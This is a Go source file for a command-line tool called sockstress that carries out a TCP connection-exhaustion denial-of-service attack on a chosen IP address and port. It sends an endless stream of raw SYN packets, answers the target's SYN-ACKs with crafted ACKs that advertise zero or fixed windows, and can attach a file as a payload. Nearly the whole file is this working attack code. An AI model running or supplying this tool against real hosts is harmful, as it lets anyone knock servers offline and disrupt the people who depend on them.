package main

import (
	"flag"
	"fmt"
	"github.com/marcelki/sockstress/tcp"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

var (
	p          = flag.Uint("p", 1, "")
	ifaceParam = flag.String("i", "", "")
	payload    = flag.String("data", "", "")
	help       = flag.Bool("h", false, "")
	delay      = flag.Duration("d", 1000, "")

	data []byte

	numSendACK    int
	numSendSYN    int
	numRecvSYNACK int
	numRecvACK    int
	numRecvRST    int
)

var usage = `Usage: sockstress [options...] <ip-address>

Options:
  -p      The destination port to attack.
  -i      The network interface to use.
  -d      The delay between SYN packets
          You can choose your unit of time (e.g. 1ns, 0.001s)
  -data   Choose a file to use as the payload/data
  -h      Display this help.

`

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

func main() {
	flag.Usage = func() {
		fmt.Fprint(os.Stderr, usage)
	}
	flag.Parse()
	if flag.NArg() < 1 || *help {
		flag.Usage()
		os.Exit(1)
	}

	dstIP := flag.Args()[0]
	port := uint16(*p)

	ip := net.ParseIP(dstIP)
	if ip == nil {
		fmt.Fprintf(os.Stderr, fmt.Sprintf("Given ip address: %v is not valid\n", dstIP))
		os.Exit(1)
	} else if port < 1 {
		fmt.Fprintf(os.Stderr, fmt.Sprintf("Port: %v is not valid\n", port))
		os.Exit(1)
	}

	var err error
	iface := *ifaceParam
	if iface == "" {
		iface, err = getInterface()
		if err != nil {
			fmt.Fprintf(os.Stderr, err.Error())
			os.Exit(1)
		}
		fmt.Fprintf(os.Stdout, fmt.Sprintf("Using the %s network interface.\n", iface))
	}
	lAddr, err := interfaceAddress(iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, err.Error())
		os.Exit(1)
	}

	if *payload != "" {
		fileInfo, err := os.Stat(*payload)
		if err != nil {
			if os.IsNotExist(err) {
				fmt.Fprintf(os.Stderr, "Given file %s does not exist\n", *payload)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, err.Error())
			os.Exit(1)
		}
		if fileInfo.IsDir() {
			fmt.Fprintf(os.Stderr, "Directories are not supported as payloads\n")
			os.Exit(1)
		}
		data, err = ioutil.ReadFile(*payload)
		if err != nil {
			log.Fatalf("Error reading %s file\n", *payload)
		}
	}

	go sendSyn(lAddr, dstIP, port)
	go listen(lAddr, dstIP)

	ticker := time.Tick(time.Second)
	for {
		fmt.Printf("SENT: syn: %v ack: %v - RECV: synack: %v ack: %v rst: %v\r", numSendSYN, numSendACK, numRecvSYNACK, numRecvACK, numRecvRST)
		<-ticker
	}

}

func listen(lAddr, rAddr string) {
	addr, err := net.ResolveIPAddr("ip4", lAddr)
	if err != nil {
		log.Fatalf("Error resolving ip address: %s\n", err)
	}
	conn, err := net.ListenIP("ip4:tcp", addr)
	if err != nil {
		log.Fatalf("Error listening ip stack: %s\n", err)
	}
	buf := make([]byte, 4096)
	for {
		n, raddr, err := conn.ReadFrom(buf)
		if err != nil {
			if nErr, ok := err.(net.Error); ok && nErr.Temporary() {
				continue
			}
			log.Fatalf("Error reading from ip socket: %s\n", err)
		}
		if raddr.String() != rAddr {
			continue
		}
		header := tcp.NewHeader(buf[:n])

		if header.HasFlag(tcp.SYN) && header.HasFlag(tcp.ACK) {
			numRecvSYNACK++
			sendAck(header, lAddr, rAddr)
		} else if header.HasFlag(tcp.ACK) {
			numRecvACK++
			sendAck(header, lAddr, rAddr)
		} else if header.HasFlag(tcp.RST) {
			numRecvRST++
		}
	}
}

func sendSyn(lAddr, rAddr string, dst uint16) {
	conn, err := net.Dial("ip4:tcp", rAddr)
	if err != nil {
		log.Fatalf("Error sending syn: %s\n", err)
	}
	defer conn.Close()
	buf := make([]byte, 256)
	for {
		p := tcp.Header{
			Source:      randUint16(1024, 65535),
			Destination: dst,
			SeqNum:      rand.Uint32(),
			AckNum:      0,
			DataOffset:  5,
			Reserved:    0,
			ECN:         0,
			Ctrl:        tcp.SYN,
			Window:      0xAAAA,
			Checksum:    0,
			Urgent:      0,
			Options:     nil,
		}
		buf = p.Marshal()
		p.Checksum = tcp.Checksum(buf, lAddr, rAddr)
		buf = p.Marshal()

		_, err = conn.Write(buf)
		if err != nil {
			// TODO: error handling
			log.Fatalf("Error sending syn: %s\n", err)
		}
		numSendSYN++
		time.Sleep(*delay)
	}
}

func sendAck(header *tcp.Header, lAddr, rAddr string) {
	conn, err := net.Dial("ip4:tcp", rAddr)
	if err != nil {
		log.Fatalf("Error connecting to: %s\n", rAddr)
	}
	defer conn.Close()
	newHeader := tcp.Header{
		Source:      header.Destination,
		Destination: header.Source,
		SeqNum:      header.AckNum,
		AckNum:      header.SeqNum,
		DataOffset:  5,
		Reserved:    0,
		ECN:         0,
		Ctrl:        tcp.ACK,
		Window:      0,
		Checksum:    0,
		Urgent:      0,
		Options:     nil,
	}
	if header.HasFlag(tcp.SYN) && header.HasFlag(tcp.ACK) {
		newHeader.AckNum += 1
	}
	buf := newHeader.Marshal()
	newHeader.Checksum = tcp.Checksum(buf, lAddr, rAddr)
	buf = newHeader.Marshal()

	if header.HasFlag(tcp.SYN) && header.HasFlag(tcp.ACK) {
		buf = append(buf, data...)
	}
	_, err = conn.Write(buf)
	if err != nil {
		// TODO: error handling
		log.Fatalf("Error sending ack: %s\n", err)
	}
	numSendACK++
}

func randUint16(min, max int) uint16 {
	return uint16(rand.Intn(max-min) + min)
}

func interfaceAddress(name string) (string, error) {
	iface, err := net.InterfaceByName(name)
	if err != nil {
		return "", fmt.Errorf("Error getting the interface by name for %s. %s\n", name, err)
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return "", fmt.Errorf("Error getting the iface address: %s\n", err)
	}
	addr := addrs[0].String()
	return strings.Split(addr, "/")[0], nil
}

func getInterface() (string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("Error getting interface: %s\n", err)
	}
	for _, iface := range ifaces {
		if iface.Name == "lo" {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return "", fmt.Errorf("Error getting address for interface %s: %s\n", iface.Name, err)
		}
		if len(addrs) > 0 {
			return iface.Name, nil
		}
	}
	return "", fmt.Errorf("No interface found\n")
}
